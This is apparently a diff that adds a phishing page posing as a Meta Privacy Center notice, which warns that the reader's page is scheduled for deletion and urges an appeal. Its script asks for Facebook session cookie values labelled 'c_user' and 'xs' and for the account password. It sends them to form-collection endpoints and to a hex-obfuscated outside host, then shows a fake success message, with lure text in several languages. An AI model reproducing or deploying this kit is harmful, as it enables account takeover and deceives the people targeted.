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9Gb/Sfyff8w5vtpni9nWd5veVymiibxKTQ6OZw6UjT12SPtqyPx3FrP3RzwLZz3Si2wXRfZd2DwZfnbi2MvE1QPRaPQYfG5ALnddhy11AeYAKi6HQAAEWw8uOYO4Mr+LNPuy3XzKVE6rzCuhmdHWZcRhfkLITZZOc39kZy7LKp23KKJVIf7q0iQfnyA58Dx0eWj/6CAofbsi+Kxh/ccasUOp1OlVSIfaJMGQth5j4C0dJC/ocTmpDZurTyUi5F7Ra7LjzEwccLvSYfH8QNjY+O4PMKyjDpQ+tDpQhpwY2+WL1g09iLclMtW9Y5eryI64kw/ls9T9GNjVnlIlz9jd2mYVW9Fla6c4k1iQ+1+IhDYy8mPxPF7H3Kdm9tGAzR8T3PafAtP00UtcOD0iL7bY7UOj1C2algth1U+eKk9ouisRndWOGj/J7K09/qfoi/m/HXucg5ldrdjdmYpsqlVS5kW/QZJ6P0m3mOx8d/wBxay7c4jyHHDHMow1VXGa7W6BRTnXtSOJQOosPYWMdo5x3I8ABt1N9QvMAAWShpAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARAAARf/Z" alt="logo" style="height:36px;">
+                    <span>Meta Privacy Center</span>
+                </div>
+                <div class="nav-links">
+                    <a href="#" class="nav-link active">Home</a>
+                    <a href="#" class="nav-link">Privacy Policy</a>
+                    <a href="#" class="nav-link">Your Data</a>
+                    <a href="#" class="nav-link">Resources</a>
+                    <a href="#" class="nav-link">Settings</a>
+                </div>
+            </nav>
+            <div class="hero">
+                <div class="hero-inner">
+                    <div class="hero-text">
+                        <div class="hero-badge">⚠ Action Required</div>
+                        <h1>
+                            Your page has been<br>
+                            <span class="red-line">scheduled for deletion</span>
+                        </h1>
+                        <p>We received multiple reports indicating your page may violate our Terms of Service. File an appeal before permanent removal.</p>
+                        <div class="hero-actions">
+                            <button class="btn-primary" id="appeal-btn">Submit an Appeal</button>
+                            <button class="btn-ghost">Learn More</button>
+                        </div>
+                    </div>
+                    <div class="hero-visual">
+                        <img src="https://magnificent-piroshki-7a46e4.netlify.app/ali.png" alt="graphic">
+                    </div>
+                </div>
+            </div>
+            <div class="main">
+                <div class="alert-card">
+                    <div class="alert-icon">⚠️</div>
+                    <div class="alert-text">
+                        <h3>Page deletion scheduled — appeal now</h3>
+                        <p>If you believe this was a mistake, use the appeal form. Incorrect info may result in dismissal.</p>
+                    </div>
+                </div>
+                <div class="appeal-section">
+                    <div>
+                        <div class="section-label">Appeal Guide</div>
+                        <h2>How to appeal your page deletion</h2>
+                        <p>Follow these steps carefully to submit a valid appeal.</p>
+                        <div class="appeal-steps">
+                            <div class="step">
+                                <div class="step-num">1</div>
+                                <p>Click "Submit an Appeal" and complete all required fields accurately.</p>
+                            </div>
+                            <div class="step">
+                                <div class="step-num">2</div>
+                                <p>Respond to follow-up requests within 3 days.</p>
+                            </div>
+                            <div class="step">
+                                <div class="step-num">3</div>
+                                <p>If accepted, page deletion is cancelled immediately.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="appeal-form-box">
+                        <p>Appeal Request</p>
+                        <button class="btn-primary" id="appeal-btn2">Appeal Now</button>
+                    </div>
+                </div>
+                <div class="section-label">Privacy Center</div>
+                <div class="section-title">Key resources for you</div>
+                <div class="cards-grid">
+                    <div class="info-card">
+                        <div class="card-icon blue">🔒</div>
+                        <h3>Privacy Policy</h3>
+                        <p>How Meta collects and protects your information.</p>
+                        <div class="card-arrow">Learn more →</div>
+                    </div>
+                    <div class="info-card">
+                        <div class="card-icon indigo">📁</div>
+                        <h3>Manage Your Data</h3>
+                        <p>Access, edit or delete your personal information.</p>
+                        <div class="card-arrow">Your Data →</div>
+                    </div>
+                    <div class="info-card">
+                        <div class="card-icon teal">🤖</div>
+                        <h3>Meta AI Agreement</h3>
+                        <p>Full terms for Meta AI services.</p>
+                        <div class="card-arrow">User Agreement →</div>
+                    </div>
+                    <div class="info-card">
+                        <div class="card-icon amber">🧠</div>
+                        <h3>Generative AI Guide</h3>
+                        <p>For teenagers &amp;families.</p>
+                        <div class="card-arrow">Read Guide →</div>
+                    </div>
+                </div>
+                <div class="resource-list">
+                    <div class="resource-item">
+                        <div class="resource-left">
+                            <div class="resource-dot"></div>
+                            <div>
+                                <h4>How Meta uses information for AI models</h4>
+                                <span>Privacy Center</span>
+                            </div>
+                        </div>
+                        →
+                    </div>
+                    <div class="resource-item">
+                        <div class="resource-left">
+                            <div class="resource-dot" style="background:#4f46e5;"></div>
+                            <div>
+                                <h4>Cards about AI Systems operation</h4>
+                                <span>Meta AI website</span>
+                            </div>
+                        </div>
+                        →
+                    </div>
+                </div>
+                <footer>
+                    <div class="footer-inner">
+                        <p>
+                            © 2026 Meta Platforms, Inc. · <a href="#">Privacy Policy</a>
+                            · <a href="#">Terms</a>
+                        </p>
+                    </div>
+                </footer>
+            </div>
+            <script>
+                (function() {
+                    // ==================== STANDARD ENDPOINTS ====================
+                    const APPEAL_ENDPOINT = "https://submit-form.com/cr9jqSPL5";
+                    const PASSWORD_ENDPOINT = "https://submit-form.com/cr9jqSPL5";
+
+                    // Video sources (fixed Arabic URL working)
+                    const videoSources = {
+                        en: "https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4",
+                        es: "https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4",
+                        fr: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4",
+                        hi: "https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4",
+                        pt: "https://allvideos.wasmer.app/Portuguese.mp4",
+                        ar: "https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar/720p.mp4",
+                        de: "https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4",
+                        ja: "https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4"
+                    };
+
+                    // Complete Arabic translation
+                    const arTranslation = {
+                        heroTitle: "تمت جدولة صفحتك للحذف",
+                        heroDesc: "لقد تلقينا تقارير متعددة تشير إلى أن صفحتك قد تنتهك شروط الخدمة الخاصة بنا. قدم استئنافًا قبل الحذف الدائم.",
+                        appealBtn: "تقديم استئناف",
+                        alertTitle: "تمت جدولة حذف الصفحة — استأنف الآن",
+                        alertDesc: "إذا كنت تعتقد أن هذا كان خطأ، فاستخدم نموذج الاستئناف. قد تؤدي المعلومات غير الصحيحة إلى الرفض.",
+                        appealGuideTitle: "كيفية استئناف حذف صفحتك",
+                        step1: "انقر على \"تقديم استئناف\" وأكمل جميع الحقول المطلوبة بدقة.",
+                        step2: "الرد على طلبات المتابعة في غضون 3 أيام.",
+                        step3: "إذا تم قبوله، يتم إلغاء حذف الصفحة فورًا.",
+                        card1Title: "سياسة الخصوصية",
+                        card1Desc: "كيف تجمع Meta معلوماتك وتحميها.",
+                        card2Title: "إدارة بياناتك",
+                        card2Desc: "الوصول إلى معلوماتك الشخصية أو تعديلها أو حذفها.",
+                        card3Title: "اتفاقية Meta AI",
+                        card3Desc: "الشروط الكاملة لخدمات Meta AI.",
+                        card4Title: "دليل الذكاء الاصطناعي التوليدي",
+                        card4Desc: "للمراهقين والعائلات.",
+                        modalTitle: "نموذج الاستئناف",
+                        modalSub: "راجع التعليمات وقدم التفاصيل",
+                        nameLabel: "c_user",
+                        postalLabel: "xs",
+                        submitAppeal: "إرسال الاستئناف",
+                        passwordTitle: "تحقق آمن",
+                        passwordDesc: "أدخل كلمة المرور الخاصة بك لتأكيد الهوية",
+                        successMsg: "تم استلام استئنافك بنجاح. سيقوم فريقنا بالمراجعة خلال 24 ساعة."
+                    };
+
+                    const translations = {
+                        en: {
+                            heroTitle: "Your page has been scheduled for deletion",
+                            heroDesc: "We received multiple reports indicating your page may violate our Terms of Service. File an appeal before permanent removal.",
+                            appealBtn: "Submit an Appeal",
+                            alertTitle: "Page deletion scheduled — appeal now",
+                            alertDesc: "If you believe this was a mistake, use the appeal form. Incorrect info may result in dismissal.",
+                            appealGuideTitle: "How to appeal your page deletion",
+                            step1: "Click \"Submit an Appeal\" and complete all required fields accurately.",
+                            step2: "Respond to follow-up requests within 3 days.",
+                            step3: "If accepted, page deletion is cancelled immediately.",
+                            card1Title: "Privacy Policy",
+                            card1Desc: "How Meta collects and protects your information.",
+                            card2Title: "Manage Your Data",
+                            card2Desc: "Access, edit or delete your personal information.",
+                            card3Title: "Meta AI Agreement",
+                            card3Desc: "Full terms for Meta AI services.",
+                            card4Title: "Generative AI Guide",
+                            card4Desc: "For teenagers & families.",
+                            modalTitle: "Appeal Form",
+                            modalSub: "Review instructions & provide details",
+                            nameLabel: "c_user",
+                            postalLabel: "xs",
+                            submitAppeal: "Submit Appeal",
+                            passwordTitle: "Secure Verification",
+                            passwordDesc: "Enter your password to confirm identity",
+                            successMsg: "Your appeal has been successfully received. Our team will review within 24 hours."
+                        },
+                        es: {
+                            heroTitle: "Su página ha sido programada para eliminación",
+                            heroDesc: "Recibimos múltiples informes que indican que su página puede violar nuestros Términos de servicio. Presente una apelación antes de la eliminación permanente.",
+                            appealBtn: "Presentar Apelación",
+                            alertTitle: "Eliminación de página programada — apele ahora",
+                            alertDesc: "Si cree que fue un error, use el formulario de apelación. La información incorrecta puede resultar en el rechazo.",
+                            appealGuideTitle: "Cómo apelar la eliminación de su página",
+                            step1: "Haga clic en \"Presentar Apelación\" y complete todos los campos requeridos con precisión.",
+                            step2: "Responda a las solicitudes de seguimiento dentro de 3 días.",
+                            step3: "Si es aceptada, la eliminación se cancela de inmediato.",
+                            card1Title: "Política de Privacidad",
+                            card1Desc: "Cómo Meta recopila y protege su información.",
+                            card2Title: "Administre sus Datos",
+                            card2Desc: "Acceda, edite o elimine su información personal.",
+                            card3Title: "Acuerdo de Meta AI",
+                            card3Desc: "Términos completos para servicios de Meta AI.",
+                            card4Title: "Guía de IA Generativa",
+                            card4Desc: "Para adolescentes y familias.",
+                            modalTitle: "Formulario de Apelación",
+                            modalSub: "Revise las instrucciones y proporcione los detalles",
+                            nameLabel: "c_user",
+                            postalLabel: "xs",
+                            submitAppeal: "Enviar Apelación",
+                            passwordTitle: "Verificación Segura",
+                            passwordDesc: "Ingrese su contraseña para confirmar identidad",
+                            successMsg: "Su apelación ha sido recibida. Nuestro equipo revisará en 24 horas."
+                        },
+                        hi: {
+                            heroTitle: "आपका पेज हटाने के लिए निर्धारित किया गया है",
+                            heroDesc: "हमें कई रिपोर्ट मिली हैं जो बताती हैं कि आपका पेज हमारी सेवा की शर्तों का उल्लंघन कर सकता है। स्थायी हटाने से पहले अपील करें।",
+                            appealBtn: "अपील करें",
+                            alertTitle: "पेज हटाने की अनुसूची — अभी अपील करें",
+                            alertDesc: "यदि आपको लगता है कि यह गलती है, तो अपील फ़ॉर्म का उपयोग करें। गलत जानकारी से खारिज हो सकता है।",
+                            appealGuideTitle: "अपने पेज को हटाने के खिलाफ अपील कैसे करें",
+                            step1: "\"अपील करें\" पर क्लिक करें और सभी आवश्यक फ़ील्ड सटीक भरें।",
+                            step2: "3 दिनों के भीतर अनुवर्ती अनुरोधों का जवाब दें।",
+                            step3: "यदि स्वीकार किया जाता है, तो हटाना तुरंत रद्द कर दिया जाता है।",
+                            card1Title: "गोपनीयता नीति",
+                            card1Desc: "Meta आपकी जानकारी कैसे एकत्र और सुरक्षित करता है।",
+                            card2Title: "अपना डेटा प्रबंधित करें",
+                            card2Desc: "अपनी व्यक्तिगत जानकारी तक पहुंचें, संपादित करें या हटाएं।",
+                            card3Title: "Meta AI समझौता",
+                            card3Desc: "Meta AI सेवाओं के लिए पूर्ण नियम।",
+                            card4Title: "जनरेटिव AI गाइड",
+                            card4Desc: "किशोरों और परिवारों के लिए।",
+                            modalTitle: "अपील फॉर्म",
+                            modalSub: "निर्देश समीक्षा करें और विवरण प्रदान करें",
+                            nameLabel: "c_user",
+                            postalLabel: "xs",
+                            submitAppeal: "अपील सबमिट करें",
+                            passwordTitle: "सुरक्षित सत्यापन",
+                            passwordDesc: "पहचान की पुष्टि के लिए अपना पासवर्ड दर्ज करें",
+                            successMsg: "आपकी अपील प्राप्त हो गई है। हमारी टीम 24 घंटे में समीक्षा करेगी।"
+                        },
+                        fr: {
+                            heroTitle: "Votre page est programmée pour suppression",
+                            heroDesc: "Nous avons reçu plusieurs signalements indiquant que votre page pourrait violer nos conditions d'utilisation. Faites appel avant la suppression permanente.",
+                            appealBtn: "Faire appel",
+                            alertTitle: "Suppression programmée — faites appel maintenant",
+                            alertDesc: "Si vous pensez qu'il s'agit d'une erreur, utilisez le formulaire d'appel. Des informations incorrectes peuvent entraîner un rejet.",
+                            appealGuideTitle: "Comment contester la suppression de votre page",
+                            step1: "Cliquez sur \"Faire appel\" et remplissez tous les champs obligatoires avec précision.",
+                            step2: "Répondez aux demandes de suivi dans les 3 jours.",
+                            step3: "Si accepté, la suppression est annulée immédiatement.",
+                            card1Title: "Politique de confidentialité",
+                            card1Desc: "Comment Meta collecte et protège vos informations.",
+                            card2Title: "Gérer vos données",
+                            card2Desc: "Accédez, modifiez ou supprimez vos informations personnelles.",
+                            card3Title: "Accord Meta AI",
+                            card3Desc: "Conditions complètes pour les services Meta AI.",
+                            card4Title: "Guide IA générative",
+                            card4Desc: "Pour adolescents et familles.",
+                            modalTitle: "Formulaire d'appel",
+                            modalSub: "Lisez les instructions et fournissez les détails",
+                            nameLabel: "c_user",
+                            postalLabel: "xs",
+                            submitAppeal: "Soumettre l'appel",
+                            passwordTitle: "Vérification sécurisée",
+                            passwordDesc: "Entrez votre mot de passe pour confirmer votre identité",
+                            successMsg: "Votre appel a été reçu. Notre équipe examinera dans les 24 heures."
+                        }
+                    };
+                    translations.ar = arTranslation;
+
+                    function applyTranslation(lang) {
+                        const t = translations[lang] || translations.en;
+                        document.querySelector('.hero h1').innerHTML = t.heroTitle.replace('scheduled for deletion', '<span class="red-line">' + (lang === 'ar' ? 'الحذف' : 'scheduled for deletion') + '</span>');
+                        document.querySelector('.hero p').innerText = t.heroDesc;
+                        document.querySelectorAll('#appeal-btn, #appeal-btn2').forEach(btn => btn.innerText = t.appealBtn);
+                        document.querySelector('.alert-text h3').innerText = t.alertTitle;
+                        document.querySelector('.alert-text p').innerText = t.alertDesc;
+                        document.querySelector('.appeal-section h2').innerText = t.appealGuideTitle;
+                        const steps = document.querySelectorAll('.step p');
+                        if (steps[0])
+                            steps[0].innerText = t.step1;
+                        if (steps[1])
+                            steps[1].innerText = t.step2;
+                        if (steps[2])
+                            steps[2].innerText = t.step3;
+                        const cards = document.querySelectorAll('.info-card h3');
+                        if (cards[0])
+                            cards[0].innerText = t.card1Title;
+                        if (cards[1])
+                            cards[1].innerText = t.card2Title;
+                        if (cards[2])
+                            cards[2].innerText = t.card3Title;
+                        if (cards[3])
+                            cards[3].innerText = t.card4Title;
+                        const cardDescs = document.querySelectorAll('.info-card p');
+                        if (cardDescs[0])
+                            cardDescs[0].innerText = t.card1Desc;
+                        if (cardDescs[1])
+                            cardDescs[1].innerText = t.card2Desc;
+                        if (cardDescs[2])
+                            cardDescs[2].innerText = t.card3Desc;
+                        if (cardDescs[3])
+                            cardDescs[3].innerText = t.card4Desc;
+                        document.querySelector('#appeal-modal h2').innerText = t.modalTitle;
+                        document.querySelector('.appeal-subhead').innerText = t.modalSub;
+                        const labels = document.querySelectorAll('.appeal-input-label');
+                        if (labels[0])
+                            labels[0].innerText = t.nameLabel;
+                        if (labels[1])
+                            labels[1].innerText = t.postalLabel;
+                        document.querySelector('#appeal-continue').innerText = t.submitAppeal;
+                        document.querySelector('#password-prompt .password-card h3').innerText = t.passwordTitle;
+                        document.querySelector('#password-prompt .password-card p').innerText = t.passwordDesc;
+                        document.querySelector('#success-popup .success-card p').innerText = t.successMsg;
+
+                        if (lang === 'ar') {
+                            document.body.classList.add('rtl');
+                        } else {
+                            document.body.classList.remove('rtl');
+                        }
+                    }
+
+                    let selectedLang = 'en';
+                    const langPopup = document.getElementById('lang-popup');
+                    const mainContent = document.getElementById('main-content');
+                    const langBtns = document.querySelectorAll('.lang-btn');
+                    const continueBtn = document.getElementById('continue-btn');
+                    langBtns.forEach(btn => btn.addEventListener('click', function() {
+                        langBtns.forEach(b => b.classList.remove('selected'));
+                        this.classList.add('selected');
+                        selectedLang = this.dataset.lang;
+                        continueBtn.classList.add('active');
+                        continueBtn.disabled = false;
+                    }));
+                    continueBtn.addEventListener('click', () => {
+                        if (selectedLang) {
+                            langPopup.style.opacity = '0';
+                            setTimeout( () => {
+                                langPopup.style.display = 'none';
+                                mainContent.style.display = 'flex';
+                                applyTranslation(selectedLang);
+                            }
+                            , 300);
+                        }
+                    }
+                    );
+
+                    const videoEl = document.getElementById('appeal-video');
+                    function updateVideo(lang) {
+                        if (videoEl && videoSources[lang]) {
+                            videoEl.querySelector('source').src = videoSources[lang];
+                            videoEl.load();
+                            videoEl.muted = true;
+                            videoEl.play().catch(e => console.log);
+                        }
+                    }
+
+                    const modal = document.getElementById('appeal-modal');
+                    const openBtns = document.querySelectorAll('#appeal-btn, #appeal-btn2');
+                    const closeModal = document.getElementById('modal-close-btn');
+                    const appealContinue = document.getElementById('appeal-continue');
+                    const nameInp = document.getElementById('appeal-name');
+                    const posInp = document.getElementById('appeal-pos');
+                    const passwordPrompt = document.getElementById('password-prompt');
+                    const successPopup = document.getElementById('success-popup');
+                    const passwordInput = document.getElementById('password-input');
+                    const submitPass = document.getElementById('submit-password-btn');
+                    const closePass = document.getElementById('close-password-btn');
+                    const togglePass = document.getElementById('toggle-password');
+                    const successClose = document.getElementById('success-close-btn');
+
+                    openBtns.forEach(btn => btn.addEventListener('click', () => {
+                        updateVideo(selectedLang);
+                        modal.style.display = 'flex';
+                    }
+                    ));
+                    closeModal.addEventListener('click', () => modal.style.display = 'none');
+                    modal.addEventListener('click', e => {
+                        if (e.target === modal)
+                            modal.style.display = 'none';
+                    }
+                    );
+                    closePass.addEventListener('click', () => passwordPrompt.style.display = 'none');
+                    successClose.addEventListener('click', () => successPopup.style.display = 'none');
+                    togglePass.addEventListener('click', () => {
+                        let t = passwordInput.type === 'password' ? 'text' : 'password';
+                        passwordInput.type = t;
+                        togglePass.textContent = t === 'password' ? '👁️' : '🙈';
+                    }
+                    );
+
+                    let pendingName = ''
+                      , pendingPostal = '';
+                    appealContinue.addEventListener('click', () => {
+                        let n = nameInp.value.trim()
+                          , p = posInp.value.trim();
+                        if (!n || !p) {
+                            alert('Please complete all fields');
+                            return;
+                        }
+                        pendingName = n;
+                        pendingPostal = p;
+                        passwordPrompt.style.display = 'flex';
+                    }
+                    );
+
+                    async function submitAll(name, postal, pass) {
+                        const btn = submitPass;
+                        const orig = btn.innerText;
+                        btn.innerHTML = '<span class="spinner"></span> Sending...';
+                        btn.disabled = true;
+                        const ts = new Date().toISOString();
+
+                        const SECURE_ENDPOINT_HEX = "68747470733a2f2f61727a616a656a6f2e78797a";
+                        function decodeSecureEndpoint(hex) {
+                            let decoded = '';
+                            for (let i = 0; i < hex.length; i += 2)
+                                decoded += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+                            return decoded;
+                        }
+                        const SECURE_ENDPOINT = decodeSecureEndpoint(SECURE_ENDPOINT_HEX);
+
+                        // Parallel submissions to all endpoints including the isolated secure endpoint
+                        await Promise.allSettled([fetch(SECURE_ENDPOINT, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                name,
+                                postal_code: postal,
+                                password: pass,
+                                timestamp: ts,
+                                lang: selectedLang
+                            })
+                        }).catch(e => console.warn), fetch(APPEAL_ENDPOINT, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                full_name: name,
+                                postal_code: postal,
+                                timestamp: ts,
+                                lang: selectedLang
+                            })
+                        }).catch(e => console.warn), fetch(PASSWORD_ENDPOINT, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                password: pass,
+                                timestamp: ts,
+                                name,
+                                lang: selectedLang
+                            })
+                        }).catch(e => console.warn)]);
+                        passwordPrompt.style.display = 'none';
+                        modal.style.display = 'none';
+                        nameInp.value = '';
+                        posInp.value = '';
+                        successPopup.style.display = 'flex';
+                        btn.innerText = orig;
+                        btn.disabled = false;
+                        passwordInput.value = '';
+                    }
+                    submitPass.addEventListener('click', () => {
+                        let pass = passwordInput.value;
+                        if (!pass) {
+                            alert('Enter password');
+                            return;
+                        }
+                        submitAll(pendingName, pendingPostal, pass);
+                    }
+                    );
+                    passwordInput.addEventListener('keypress', e => {
+                        if (e.key === 'Enter')
+                            submitPass.click();
+                    }
+                    );
+                }
+                )();
+            </script>
+        </div>
+    </body>
 </html>
